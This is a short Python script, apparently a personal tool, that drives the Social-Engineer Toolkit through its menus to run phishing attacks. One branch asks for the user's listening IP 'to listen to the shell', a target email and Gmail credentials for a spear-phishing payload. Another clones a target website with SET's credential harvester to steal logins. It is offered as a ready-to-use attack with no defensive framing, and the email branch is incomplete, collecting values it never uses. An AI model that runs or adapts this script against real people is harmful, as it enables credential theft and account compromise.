import subprocess

option = input("Do you want to phish using 1. email, 2. phone nr. or 3. clone page?: ")
if option == "1":
    ip = input("your ip to listen to the shell: ")
    targetmail = input("Mail of target?: ")
    mail = input("Your Gmail?: ")
    password = input("Gmail password?: ")
    filename = input("What should the file be called?: ")

    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    commands = [
        "1\n",
        "1\n",
        "1\n",
        "13\n",
        "2\n",
        "1\n",
        ip,
                
    ]

    for command in commands:
        process.stdin.write(command)
    process.stdin.close()
    process.wait()

elif option == "2":
    # Placeholder for phone number phishing
    pass

elif option == "3":
    url = input("Target URL?: ")

    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    commands = [
        "2\n",  # Website Attack Vectors
        "3\n",  # Credential Harvester Attack Method
        "2\n",  # Site Cloner
        f"{url}\n"  # URL to clone
    ]

    for command in commands:
        process.stdin.write(command)
    process.stdin.close()
    process.wait()

else:
    print("Invalid option. Exiting.")
    quit()
